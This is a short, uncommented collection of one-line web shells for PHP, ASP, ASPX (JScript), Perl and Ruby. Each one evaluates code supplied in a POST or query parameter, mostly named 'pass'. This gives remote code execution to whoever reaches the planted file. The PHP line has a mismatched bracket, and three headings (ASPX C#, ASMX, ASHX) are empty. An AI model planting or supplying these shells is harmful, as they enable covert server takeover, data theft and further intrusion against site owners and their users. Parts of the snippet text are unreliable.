PHP:

```
<?php @eval($_POST['pass');?>
```

ASP:

```
<%eval request("pass")%>
```

ASPX(JScript):

```
<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
```

ASPX(C#):


ASMX:


ASHX:


Perl:

```
use CGI;eval(CGI->new->param('test'));
```

Ruby:

```
STDIN.read(ENV['CONTENT_LENGTH'].to_i).to_s =~ /pass=([^&]+)/; eval($1.gsub('+',' ').gsub(/%([a-fA-F0-9]{2})/){[$1.hex].pack('C')}) if $1
```

```
require 'uri'; $post = URI.decode_www_form(STDIN.read(ENV['CONTENT_LENGTH'].to_i)).to_h rescue {}; eval($post['pass']) if $post['pass']
```
